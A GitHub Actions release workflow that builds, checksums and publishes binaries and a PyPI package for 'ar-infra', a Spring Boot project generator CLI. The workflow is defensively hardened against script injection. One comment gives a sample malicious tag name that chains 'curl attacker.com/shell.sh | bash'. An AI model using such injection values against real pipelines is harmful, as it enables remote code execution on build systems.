name: Release

on:
  push:
    tags:
      - "v[0-9]+.[0-9]+.[0-9]+"
  workflow_dispatch:

permissions:
  contents: write
  packages: write
  id-token: write

jobs:
  security-gate:
    name: Security Gate
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      # FIX: github.ref_name moved to env var -- never interpolated directly into shell.
      # Prevents CWE-78 script injection: attacker could push tag "v1.0.0; curl attacker.com/shell.sh | bash"
      # Ref: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
      - name: Verify tag format
        env:
          REF_NAME: ${{ github.ref_name }}
        run: |
          if [[ ! "$REF_NAME" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "Error: Tag must follow semantic versioning (e.g., v0.2.0)"
            exit 1
          fi

      - name: Check for .env file
        run: |
          if [ -f ".env" ]; then
            echo "ERROR: .env file found in repository"
            exit 1
          fi

      - name: Verify version consistency
        env:
          TAG_VERSION: ${{ github.ref_name }}
        run: |
          TAG_VERSION="${TAG_VERSION#v}"
          PYPROJECT_VERSION=$(grep '^version = ' pyproject.toml | grep -oP '(?<=version = ")[^"]+')

          if [ "$TAG_VERSION" != "$PYPROJECT_VERSION" ]; then
            echo "Error: Tag version ($TAG_VERSION) does not match pyproject.toml version ($PYPROJECT_VERSION)"
            exit 1
          fi

          echo "Version check passed: $TAG_VERSION"

  build:
    name: Build Binary - ${{ matrix.os-name }}
    needs: security-gate
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: ubuntu-22.04
            os-name: Linux x86_64
            artifact_name: ar-infra
            asset_name: ar-infra-linux-amd64
          - os: macos-14
            os-name: macOS ARM64
            artifact_name: ar-infra
            asset_name: ar-infra-macos-arm64
            arch: arm64
          - os: macos-14
            os-name: macOS Intel (cross-compiled)
            artifact_name: ar-infra
            asset_name: ar-infra-macos-amd64
            arch: x86_64
          - os: windows-2022
            os-name: Windows x86_64
            artifact_name: ar-infra.exe
            asset_name: ar-infra-windows-amd64.exe

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pyinstaller
        shell: bash

      - name: Install Linux-specific tools
        if: runner.os == 'Linux'
        run: |
          pip install staticx patchelf
        shell: bash

      - name: Build binary with PyInstaller
        run: |
          pyinstaller ar-infra.spec
        shell: bash

      - name: Verify Linux binary
        if: runner.os == 'Linux'
        env:
          ARTIFACT_NAME: ${{ matrix.artifact_name }}
        run: |
          cd dist
          file "$ARTIFACT_NAME"
          ldd "$ARTIFACT_NAME" || echo "Static binary or non-ELF"
        shell: bash

      - name: Rename binary
        env:
          ARTIFACT_NAME: ${{ matrix.artifact_name }}
          ASSET_NAME: ${{ matrix.asset_name }}
        run: |
          cd dist
          mv "$ARTIFACT_NAME" "$ASSET_NAME"
        shell: bash

      - name: Test binary
        env:
          ASSET_NAME: ${{ matrix.asset_name }}
        run: |
          cd dist
          if [[ "${{ runner.os }}" == "Windows" ]]; then
            "./$ASSET_NAME" --version
            "./$ASSET_NAME" init --help
            "./$ASSET_NAME" add-dependency --help
          else
            chmod +x "./$ASSET_NAME"
            "./$ASSET_NAME" --version
            "./$ASSET_NAME" init --help
            "./$ASSET_NAME" add-dependency --help
          fi
        shell: bash

      - name: Calculate SHA256 checksum (Unix)
        if: runner.os != 'Windows'
        env:
          ASSET_NAME: ${{ matrix.asset_name }}
        run: |
          cd dist
          shasum -a 256 "$ASSET_NAME" > "$ASSET_NAME.sha256"
        shell: bash

      - name: Calculate SHA256 checksum (Windows)
        if: runner.os == 'Windows'
        env:
          ASSET_NAME: ${{ matrix.asset_name }}
        run: |
          cd dist
          $hash = (Get-FileHash -Path "$env:ASSET_NAME" -Algorithm SHA256).Hash.ToLower()
          $filename = "$env:ASSET_NAME"
          "$hash  $filename" | Out-File -Encoding ascii -NoNewline "$env:ASSET_NAME.sha256"
        shell: pwsh

      - name: Upload build artifact
        uses: actions/upload-artifact@v7
        with:
          name: ${{ matrix.asset_name }}
          path: |
            dist/${{ matrix.asset_name }}
            dist/${{ matrix.asset_name }}.sha256
          if-no-files-found: error
          retention-days: 90

  create-release:
    name: Create GitHub Release
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: dist-artifacts

      - name: Prepare release assets
        run: |
          mkdir -p release-assets
          find dist-artifacts -type f -exec cp {} release-assets/ \;
          ls -lah release-assets/

      - name: Extract version number
        id: version
        env:
          REF_NAME: ${{ github.ref_name }}
        run: |
          VERSION="$REF_NAME"
          VERSION_NUMBER="${VERSION#v}"
          echo "version=${VERSION}" >> $GITHUB_OUTPUT
          echo "version_number=${VERSION_NUMBER}" >> $GITHUB_OUTPUT

          PREVIOUS_TAG=$(git tag --sort=-v:refname | grep -v "$VERSION" | head -n 1)
          echo "previous_tag=${PREVIOUS_TAG:-$(git rev-list --max-parents=0 HEAD)}" >> $GITHUB_OUTPUT

      - name: Generate release notes
        env:
          VERSION: ${{ steps.version.outputs.version }}
          PREVIOUS_TAG: ${{ steps.version.outputs.previous_tag }}
          REPO: ${{ github.repository }}
          REF_NAME: ${{ github.ref_name }}
          SERVER_URL: ${{ github.server_url }}
        run: |
          # Defense-in-depth: re-validate VERSION before using it in a file path (CWE-22).
          # security-gate already checked this, but we never trust a single gate for path construction.
          if [[ ! "$VERSION" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "ERROR: Invalid version format -- aborting to prevent path traversal"
            exit 1
          fi

          if [ -f "release-notes/${VERSION}.md" ]; then
            echo "Using custom release notes from release-notes/${VERSION}.md"
            cat "release-notes/${VERSION}.md" > release_notes.md
          else
            echo "Generating default release notes"
            cat > release_notes.md << EOF
          ## AR-Infra CLI ${REF_NAME}

          Production-ready Spring Boot project generator with MySQL support and enhanced dependency management.

          ### What's Changed

          See the [full changelog](https://github.com/${REPO}/compare/${PREVIOUS_TAG}...${REF_NAME}) for details.

          ### Installation Methods

          #### Option 1: Binary (Recommended - No Python Required)

          **Linux (x86_64) - Compatible with Ubuntu, Debian, Fedora, CentOS, RHEL, etc.:**
          \`\`\`bash
          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-linux-amd64
          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-linux-amd64.sha256
          shasum -a 256 -c ar-infra-linux-amd64.sha256
          chmod +x ar-infra-linux-amd64
          sudo mv ar-infra-linux-amd64 /usr/local/bin/ar-infra
          \`\`\`

          **macOS (Intel):**
          \`\`\`bash
          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-amd64
          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-amd64.sha256
          shasum -a 256 -c ar-infra-macos-amd64.sha256
          chmod +x ar-infra-macos-amd64
          sudo mv ar-infra-macos-amd64 /usr/local/bin/ar-infra
          \`\`\`

          **macOS (Apple Silicon):**
          \`\`\`bash
          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-arm64
          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-arm64.sha256
          shasum -a 256 -c ar-infra-macos-arm64.sha256
          chmod +x ar-infra-macos-arm64
          sudo mv ar-infra-macos-arm64 /usr/local/bin/ar-infra
          \`\`\`

          **Windows (PowerShell as Administrator):**
          \`\`\`powershell
          Invoke-WebRequest -Uri "https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-windows-amd64.exe" -OutFile "ar-infra.exe"
          Invoke-WebRequest -Uri "https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-windows-amd64.exe.sha256" -OutFile "ar-infra.exe.sha256"
          certutil -hashfile ar-infra.exe SHA256
          Move-Item ar-infra.exe C:\Windows\System32\ar-infra.exe
          \`\`\`

          #### Option 2: Install via pip/pipx (Python Required)
          \`\`\`bash
          pipx install ar-infra-cli

          pip install ar-infra-cli
          \`\`\`

          ### Quick Start
          \`\`\`bash
          ar-infra init

          ar-infra init --group=com.example --artifact=myapp --features=mysql,rabbitmq

          ar-infra add-dependency "implementation 'io.jsonwebtoken:jjwt-api:0.13.0'"
          \`\`\`

          ### What's New in This Release

          - **MySQL Database Support**: Choose between PostgreSQL and MySQL during initialization
          - **New \`add-dependency\` Command**: Add Gradle dependencies to existing projects
          - **Enhanced Feature Selection**: Separate database choice from infrastructure components
          - **Template Compatibility**: Tag-based cloning ensures version compatibility
          - **OpenAPI Documentation**: SwaggerHandler removes unused endpoints based on features
          - **\`--no-feature\` Flag**: Generate minimal Spring Boot projects without infrastructure

          ### Platform Compatibility

          - **Linux**: Static binary compatible with glibc 2.17+ (Ubuntu 14.04+, Debian 8+, CentOS 7+, Fedora, Arch, etc.)
          - **macOS**: Compatible with macOS 10.13+ (Intel) and macOS 11+ (Apple Silicon)
          - **Windows**: Compatible with Windows 10/11 and Windows Server 2016+

          ### Security

          - Verify checksums before installation
          - Binaries built via GitHub Actions with full audit trail
          - [View source code](${SERVER_URL}/${REPO})

          ### Documentation

          Full documentation: https://github.com/${REPO}
          EOF
          fi

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          files: release-assets/*
          body_path: release_notes.md
          draft: false
          prerelease: false
          generate_release_notes: true
          fail_on_unmatched_files: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  publish-pypi:
    name: Publish to PyPI
    needs: security-gate
    runs-on: ubuntu-latest
    environment:
      name: pypi
      url: https://pypi.org/p/ar-infra-cli
    permissions:
      id-token: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install build tools
        run: |
          python -m pip install --upgrade pip
          pip install build twine

      - name: Verify package resources
        run: |
          if [ ! -f "src/ar_infra/cli/resources/banner.txt" ]; then
            echo "ERROR: Banner file not found!"
            exit 1
          fi
          echo "Banner file found."

      - name: Build package
        run: python -m build

      - name: Check distribution
        run: |
          twine check dist/*
          echo "Package contents:"
          unzip -l dist/*.whl | grep -i banner

      - name: Publish to PyPI
        uses: pypa/gh-action-pypi-publish@release/v1
        with:
          password: ${{ secrets.PYPI_TOKEN }}
          skip-existing: true
          verbose: true
          print-hash: true
